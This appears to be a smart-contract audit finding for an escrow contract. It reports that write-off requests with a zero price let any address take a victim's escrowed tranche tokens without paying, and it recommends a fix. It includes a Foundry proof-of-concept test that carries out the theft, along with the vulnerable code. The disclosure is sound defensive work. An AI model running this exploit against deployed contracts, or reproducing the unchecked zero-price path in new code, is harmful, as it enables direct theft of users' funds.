### Title
Zero-priced write-off requests let anyone steal escrowed tranche tokens for free - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` accepts `underlyingsRequested == 0` while `fullfillWriteOffRequest` only enforces `_underlyings >= currentRequest.underlyings`. A request carrying a zero price is a null-equivalent state (uninitialized price field treated as valid): any address can fulfill it with `_underlyings = 0`, pay nothing, and receive the victim's entire escrowed tranche-token balance.

### Finding Description
In `createWriteOffRequest` the only validation is `amount != 0` and that the epoch is running; `underlyingsRequested` is unchecked and is accumulated into `userRequests[msg.sender].underlyings` and `pendingUnderlyings` [1](#0-0) . In `fullfillWriteOffRequest`, permissionless by design (`@dev this function can be called by any wallet`), the match check is `currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings` [2](#0-1) . With `underlyings == 0` stored, the check passes for `_underlyings = 0`, the request is deleted, `safeTransferFrom(msg.sender, this, 0)` is a no-op, no fee is charged, `safeTransfer(_user, 0)` pays the victim nothing, and `tranche.safeTransfer(msg.sender, _tranches)` hands all escrowed tranche tokens to the caller [3](#0-2) . Neither `deleteWriteOffRequest` nor any other path distinguishes a "price never set" request from a deliberately free one, so the zero value acts like a dereferenced null price. Existing guards (nonReentrant, Is0 on tranches, WrongRequest) do not stop it.

### Impact Explanation
Direct theft of tranche tokens. A write-off request created with `underlyingsRequested = 0` (user input error, or a legacy/upgraded escrow entry whose price field was never populated, a case the code explicitly accommodates for `pendingUnderlyings` at line 112/134) can be drained by any unprivileged EOA at zero cost. The attacker obtains the full escrowed tranche position, redeemable for its pro-rata share of vault NAV via `requestWithdraw`; loss equals the victim's escrowed tranche value.

### Likelihood Explanation
Requires a victim to have a live request with `underlyings == 0`. The contract permits this state, offers no warning or revert, and the permissionless fulfill path means the first observer (including a bot monitoring `createWriteOffRequest` calls) takes the tokens in the same or next block. It cannot be forced on an unwilling user, which keeps severity at medium rather than high.

### Recommendation
Revert in `createWriteOffRequest` when `underlyingsRequested == 0` (`if (underlyingsRequested == 0) revert NotAllowed();`), mirroring the existing `amount == 0` check. Optionally also require `_underlyings != 0` in `fullfillWriteOffRequest` for defense in depth, and provide a way to amend a stored request's price.

### Proof of Concept
Foundry fork test against the deployed escrow (setup per `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`):

```solidity
// contracts: escrow (IdleCreditVaultWriteOffEscrow), tranche, underlying, cdoEpoch
function testStealZeroPricedWriteOffRequest() external {
    // victim creates a request depositing 10_000 tranche tokens but forgets the price
    vm.prank(LP); // LP holds AA tranche tokens and approved the escrow
    escrow.createWriteOffRequest(10_000e18, 0); // accepted: no underlyingsRequested != 0 check

    // attacker (any EOA, no KYC, no funds) fulfills with zero payment
    address attacker = makeAddr("attacker");
    uint256 attackerTranchePre = tranche.balanceOf(attacker);
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, 10_000e18, 0); // passes: 0 >= stored underlyings

    // attacker received all escrowed tranches; victim received nothing
    assertEq(tranche.balanceOf(attacker) - attackerTranchePre, 10_000e18);
    (uint256 t, uint256 u) = escrow.userRequests(LP);
    assertEq(t, 0);
    assertEq(u, 0);
    // attacker can now redeem the stolen tranches via cdoEpoch.requestWithdraw in the next buffer period
}
```

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

```text
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }
```
